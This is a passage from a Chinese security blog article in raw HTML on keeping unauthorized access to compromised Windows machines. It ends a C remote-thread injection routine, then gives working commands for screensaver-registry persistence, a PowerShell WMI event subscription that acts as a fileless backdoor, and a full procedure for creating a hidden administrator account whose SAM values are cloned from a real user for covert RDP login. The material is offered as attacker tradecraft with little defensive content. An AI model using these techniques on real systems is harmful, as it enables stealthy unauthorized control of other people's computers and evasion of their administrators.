class="code-snippet__string">"[*] Get ZwCreateThreadEx Address Successfully! Address is %x\n"</span>, ZwCreateThreadEx);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">HANDLE hRemoteThread = <span class="code-snippet__literal">NULL</span>;</span></code><code><span class="code-snippet_outer">DWORD ZwRet = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">ZwRet = ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="code-snippet__literal">NULL</span>, hHandle,</span></code><code><span class="code-snippet_outer">(LPTHREAD_START_ROUTINE)Memory, <span class="code-snippet__literal">NULL</span>, <span class="code-snippet__number">0</span>, <span class="code-snippet__number">0</span>, <span class="code-snippet__number">0</span>, <span class="code-snippet__number">0</span>, <span class="code-snippet__literal">NULL</span>);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (hRemoteThread == <span class="code-snippet__literal">NULL</span>)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[!] Creat RemoteThread Error,Error is:%d\n"</span>, GetLastError());</span></code><code><span class="code-snippet_outer">getchar();</span></code><code><span class="code-snippet_outer">VirtualFreeEx(hHandle, Memory, <span class="code-snippet__number">0</span>, MEM_RELEASE);</span></code><code><span class="code-snippet_outer">CloseHandle(hHandle);</span></code><code><span class="code-snippet_outer">FreeLibrary(hNtdll);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> FALSE;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">WaitForSingleObject(hRemoteThread, INFINITE);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> TRUE;</span></code><code><span class="code-snippet_outer">}</span></code></pre></section><section style="line-height: 1.75em;"><strong style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><br  /></strong></section><section style="line-height: 1.75em;"><strong style="font-size:15px;line-height:35px;;letter-spacing: 1px;">0x11&nbsp;屏幕保护程序</strong><br  /><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section style="line-height: 1.75em;"><strong style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><br  /></strong></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>利用前提:对方开启了屏幕保护</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的，攻击者可以利用屏幕保护程序来隐藏shell,达到一定的权限维持。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">注册表位置:</span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="properties"><code><span class="code-snippet_outer"><span class="code-snippet__attr">HKEY_CURRENT_USER\Control</span> <span class="code-snippet__string">Panel\Desktop</span></span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">命令行修改:</span><br  /></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="cs"><code><span class="code-snippet_outer">reg <span class="code-snippet__keyword">add</span> <span class="code-snippet__string">"HKEY_CURRENT_USER\Control Panel\Desktop"</span> /v SCRNSAVE.EXE /d C:\Windows\System32\cmd.exe</span></code></pre></section><section style="line-height: 1.75em;"><img data-ratio="0.06080347448425624" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/25_ge0gXBlJhRdRr5tAzTSzpcAOtNCdJg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0VMgPhWACkF487IPWx7bX75zcge0gXBlJhRdRr5tAzTSzpcAOtNCdJg/640?wx_fmt=png'" data-type="png" data-w="921"  /><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.5042174320524836" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/26_ic16uKNWls0xoOwlPtC811LLez97VA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0rG8xExPDSa1qowgVMtNoB2ibHDic16uKNWls0xoOwlPtC811LLez97VA/640?wx_fmt=png'" data-type="png" data-w="1067"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">这里可以改成我们的马,达到维持权限的效果,具体时间为注册表的ScreenSaverTimeout值有关</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><br  /></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>0x12&nbsp;WMI构造无文件后门</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">WMI是一项Windows管理技术，其全称是Windows Management Instrumentation，即Windows管理规范。大多数基于Windows的软件依赖于此服务。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">无文件无进程使得他非常隐蔽成为后门，但由于他的隐蔽性现在被大多数杀软所查杀。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">通过与Powershell命令配合使用可以实现无文件，具有良好的隐蔽性也是目前较为常用的持久化手段。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><br  /></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">如果展开讲会讲很久，这里推荐一篇比较详细的文章:</span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer">https:<span class="code-snippet__regexp">//wooyun</span>.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html</span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="powershell"><code><span class="code-snippet_outer"><span class="code-snippet__variable">$filterName</span> = <span class="code-snippet__string">'SD'</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__variable">$consumerName</span> = <span class="code-snippet__string">'SDD'</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__variable">$exePath</span> = <span class="code-snippet__string">'C:\Windows\System32\cmd.exe'</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__variable">$Query</span> = <span class="code-snippet__string">"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;=200 AND TargetInstance.SystemUpTime &lt; 320"</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__variable">$WMIEventFilter</span> = <span class="code-snippet__built_in">Set-WmiInstance</span> -Class __EventFilter -NameSpace <span class="code-snippet__string">"root\subscription"</span> -Arguments @{Name=<span class="code-snippet__variable">$filterName</span>;EventNameSpace=<span class="code-snippet__string">"root\cimv2"</span>;QueryLanguage=<span class="code-snippet__string">"WQL"</span>;Query=<span class="code-snippet__variable">$Query</span>} -ErrorAction Stop</span></code><code><span class="code-snippet_outer"><span class="code-snippet__variable">$WMIEventConsumer</span> = <span class="code-snippet__built_in">Set-WmiInstance</span> -Class CommandLineEventConsumer -Namespace <span class="code-snippet__string">"root\subscription"</span> -Arguments @{Name=<span class="code-snippet__variable">$consumerName</span>;ExecutablePath=<span class="code-snippet__variable">$exePath</span>;CommandLineTemplate=<span class="code-snippet__variable">$exePath</span>}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">Set-WmiInstance</span> -Class __FilterToConsumerBinding -Namespace <span class="code-snippet__string">"root\subscription"</span> -Arguments @{<span class="code-snippet__keyword">Filter</span>=<span class="code-snippet__variable">$WMIEventFilter</span>;Consumer=<span class="code-snippet__variable">$WMIEventConsumer</span>}</span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">可以使用Autoruns进行查看</span></section><section style="line-height: 1.75em;"><img data-ratio="0.5101694915254237" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/27_OI7IecrILqauKic7tMUe6FJEh0IInA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0V6ia7VWEvU80ROmbOWqDuLvgzBOI7IecrILqauKic7tMUe6FJEh0IInA/640?wx_fmt=png'" data-type="png" data-w="1180"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>0x13 影子用户</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">影子用户即创建的隐藏用户，它无法通过普通命令进行查询，比较隐蔽。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">这里以win10作为演示</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">们先利用命令创建一个隐藏用户,并将其加入本地管理员组。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="bash"><code><span class="code-snippet_outer">net user <span class="code-snippet__built_in">test</span>$ 123456 /add</span></code><code><span class="code-snippet_outer">net localgroup administrators <span class="code-snippet__built_in">test</span>$ /add</span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.11424903722721438" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/28_w5lxAicrUiaFG7WLPFxUVym36CgUDw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0YHHRkmBJpR4LNPYMWibygAoWVNew5lxAicrUiaFG7WLPFxUVym36CgUDw/640?wx_fmt=png'" data-type="png" data-w="779"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">net user无法查看</span><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.16359163591635917" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/29_4lMKRQB02FRosFDQMLl5iaez9chRbQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0z2eWgHgtYgayQrXmI9WldpuK34lMKRQB02FRosFDQMLl5iaez9chRbQ/640?wx_fmt=png'" data-type="png" data-w="813"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">但是可以在计算机管理和登陆页面中看到</span><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.47606019151846785" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/30_Xqj2x01YZicvDuYzyTKmQQfCBRjQTA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0KTkwCyonvHofZleLY4icDHrGN1Xqj2x01YZicvDuYzyTKmQQfCBRjQTA/640?wx_fmt=png'" data-type="png" data-w="731"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span><img data-ratio="0.5733438485804416" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/31_LtMwDhonVv4AeQpiaPI7pQz36jHkAg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0vI6DC7KmTsEYr8iaqKaFVZzo0SLtMwDhonVv4AeQpiaPI7pQz36jHkAg/640?wx_fmt=png'" data-type="png" data-w="1268"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span><strong style="font-size:15px;line-height:35px;;letter-spacing: 1px;">解决办法:</strong></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">打开注册表:</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">HKEY_LOCAL_MACHINE\SAM\SAM</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">修改权限:</span></section><section style="line-height: 1.75em;"><img data-ratio="0.5509803921568628" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/32_c6tad3p5ibxbECmJKWkE7CNcTBwMfQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0icAPnyC0QlE2jE06hQwutO2SxFc6tad3p5ibxbECmJKWkE7CNcTBwMfQ/640?wx_fmt=png'" data-type="png" data-w="1020"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span><img data-backh="579" data-backw="379" data-ratio="1.5277044854881265" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/33_sNeR0qywQB8pUmCcUB5WNKiaewOYBg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl07icbHjWXdv9yKWhUuzCxgClc4BsNeR0qywQB8pUmCcUB5WNKiaewOYBg/640?wx_fmt=png'" data-type="png" data-w="379" style="width: 100%;height: auto;"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">修改完权限之后，我们重新启动注册表即可继续查看内容。</span><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>查看F值</strong></span></section><section style="line-height: 1.75em;"><img data-ratio="0.555662188099808" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/34_kDODmATmN7DsIMCicn4RGg2acibJFw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0otbPsmicxZdxePASsR8gCxdia9SwkDODmATmN7DsIMCicn4RGg2acibJFw/640?wx_fmt=png'" data-type="png" data-w="1042"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">导出这三个值</span><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.49" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/35_CH6GmsHpVCaxsxENLKhEew1REYFGeQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0N8RjKnlxXYAobX715hicjNIldCH6GmsHpVCaxsxENLKhEew1REYFGeQ/640?wx_fmt=png'" data-type="png" data-w="1200"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">test$导出为1.reg</span><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">000003EC包含test$用户的F值，导出另存为2.reg<br  />000003E9包含WIN10用户的F值，导出另存为3.reg</span></section><section style="line-height: 1.75em;"><img data-ratio="0.519916142557652" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/36_7ECGInxwEueibU8MdD5lkGCCMTicbw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0bnTicmGWxnWDH4n1zOOY12lbOOv7ECGInxwEueibU8MdD5lkGCCMTicbw/640?wx_fmt=png'" data-type="png" data-w="477"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">将2.reg中的F值替换为3.reg中的F值，即将test$用户的F值替换为WIN10用户的F值</span></section><section style="line-height: 1.75em;"><img data-ratio="0.6434474616292798" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/37_sBp0HIPVT5Xx4U67QaODjsS3kkcv9Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0OOzJ8zgARTdKEtZoz9hSyJHPsBp0HIPVT5Xx4U67QaODjsS3kkcv9Q/640?wx_fmt=png'" data-type="png" data-w="847"  /></section><section style="line-height: 1.75em;"><strong style="font-size:15px;line-height:35px;;letter-spacing: 1px;">删除test$</strong></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="bash"><code><span class="code-snippet_outer">net user <span class="code-snippet__built_in">test</span>$ /del</span></code></pre></section><section style="line-height: 1.75em;"><img data-ratio="0.3217391304347826" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/38_piarmhqFK2Ghic39t9hUcC0vp6bGWA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0Vxc13XvdUBnGeIqqicIksIM99AepiarmhqFK2Ghic39t9hUcC0vp6bGWA/640?wx_fmt=png'" data-type="png" data-w="575"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">注册表就已经无法打开了</span><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.4629237288135593" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/39_uQW96YvBGPdbHAQU0tVsODvFZ7Usqw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0apw0ZGg1HIEALnXTR2ibNWvJjuQW96YvBGPdbHAQU0tVsODvFZ7Usqw/640?wx_fmt=png'" data-type="png" data-w="944"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>导入注册表</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="properties"><code><span class="code-snippet_outer"><span class="code-snippet__attr">regedit</span> <span class="code-snippet__string">/s 1.reg</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">regedit</span> <span class="code-snippet__string">/s 2.reg</span></span></code></pre></section><section style="line-height: 1.75em;"><strong style="font-size:15px;line-height:35px;;letter-spacing: 1px;">查看效果</strong><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.45931758530183725" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/40_CAOm6iaPiaNmHwAnqmoNvkUoaibKIA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0dPz0ve4tE0TYqqKMsdHEmfYDicqbCAOm6iaPiaNmHwAnqmoNvkUoaibKIA/640?wx_fmt=png'" data-type="png" data-w="762"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">但登录界面已经没有账户</span><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.5039432176656151" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/41_6BiczuC9EL3bLP37G0X9z2fP5aQvdw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0zCXYeQKjglBicV1eOJRA2yGQF86BiczuC9EL3bLP37G0X9z2fP5aQvdw/640?wx_fmt=png'" data-type="png" data-w="1268"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">3389直接登录,以test$账号登录</span><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">但是登陆之后的身份却是原来WIN10用户，桌面也是原用户的，达到克隆效果。</span></section><section style="line-height: 1.75em;"><img data-ratio="0.5138121546961326" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/42_Ybl9vjfJXXGtIsyUygrNpXP5PaQneQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0vEwv3FXsK7rPDaqticr2cGL7mYbl9vjfJXXGtIsyUygrNpXP5PaQneQ/640?wx_fmt=png'" data-type="png" data-w="1267"  /></section><section style="line-height: 1.75em;"><strong style="font-size:15px;line-height:35px;;letter-spacing: 1px;">总结</strong></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">一边复现一边写,发现很多都需要权限，或者说如果有更高的权限能做的事更加的多,包括很多操作现在已经被各种终端设备监控,所以维权实际上是建立在免杀和提权之后的。我总结的可能不太全面,欢迎补充。</span></section><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); color: rgb(163, 163, 163) !important;" class="js_darkmode__0" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><img data-ratio="0.109375" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/43_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" data-type="png" data-w="640" style="box-sizing: border-box !important;visibility: visible !important;width: 640px !important;"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__1" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><br data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><strong>推荐阅读：</strong></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247493305&amp;idx=1&amp;sn=5b292ca23204c7c6adabaff3bc6d7edf&amp;chksm=ec1cb386db6b3a90e08b077116175120e078e74697832f9455eb2dc7020334955b8642af8288&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2" hasload="1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);cursor: pointer;font-size:16px;line-height:36px;;"><strong>干货 | 如何快速完成DLL劫持，实现权限维持，重启上线</strong></a><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, 